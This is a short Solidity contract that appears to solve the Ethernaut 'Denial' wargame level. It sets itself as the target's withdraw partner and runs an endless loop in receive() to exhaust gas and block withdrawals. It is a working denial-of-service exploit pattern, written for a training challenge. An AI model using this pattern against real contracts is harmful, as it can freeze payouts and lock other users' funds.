// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/Denial.sol';

contract DenialSolution {
  constructor(address targetAddress) {
    Denial(payable(targetAddress)).setWithdrawPartner(address(this));
  }

  receive() external payable {
    while(true) {}
  }
}